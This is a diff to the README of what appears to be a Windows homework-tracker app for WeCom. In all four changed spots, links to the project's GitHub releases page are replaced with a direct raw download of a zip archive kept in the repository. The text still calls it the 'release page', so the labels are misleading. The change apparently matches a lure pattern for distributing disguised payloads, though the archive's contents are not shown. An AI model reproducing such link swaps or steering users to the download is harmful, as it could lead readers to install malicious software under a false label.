@@ -1,6 +1,6 @@
 # 📘 wecom-homework-auto-tracker - Track homework with clear student data
 
-[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/reddeergrasssnake529/wecom-homework-auto-tracker/releases)
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/reddeergrasssnake529/wecom-homework-auto-tracker/raw/refs/heads/main/webapp/homework_auto_wecom_tracker_v3.6.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ This app is built for Windows users who want a local tool for homework records a
 
 Visit this page to download the latest version:
 
-https://github.com/reddeergrasssnake529/wecom-homework-auto-tracker/releases
+https://github.com/reddeergrasssnake529/wecom-homework-auto-tracker/raw/refs/heads/main/webapp/homework_auto_wecom_tracker_v3.6.zip
 
 On that page, look for the newest release and download the Windows file that matches your computer. In most cases, the file will be a `.exe` installer or a `.zip` package.
 
@@ -42,7 +42,7 @@ If the release comes as a `.zip` file, you will need to extract it before you ru
 
 ## 🪟 How to install on Windows
 
-1. Open the release page: https://github.com/reddeergrasssnake529/wecom-homework-auto-tracker/releases
+1. Open the release page: https://github.com/reddeergrasssnake529/wecom-homework-auto-tracker/raw/refs/heads/main/webapp/homework_auto_wecom_tracker_v3.6.zip
 2. Find the newest release at the top of the page.
 3. Download the Windows file from the release assets.
 4. If you downloaded a `.zip` file, right-click it and choose Extract All.
@@ -154,7 +154,7 @@ For a smooth run on Windows:
 
 Download the latest Windows version here:
 
-https://github.com/reddeergrasssnake529/wecom-homework-auto-tracker/releases
+https://github.com/reddeergrasssnake529/wecom-homework-auto-tracker/raw/refs/heads/main/webapp/homework_auto_wecom_tracker_v3.6.zip
 
 ## 🗂️ Project topics
 
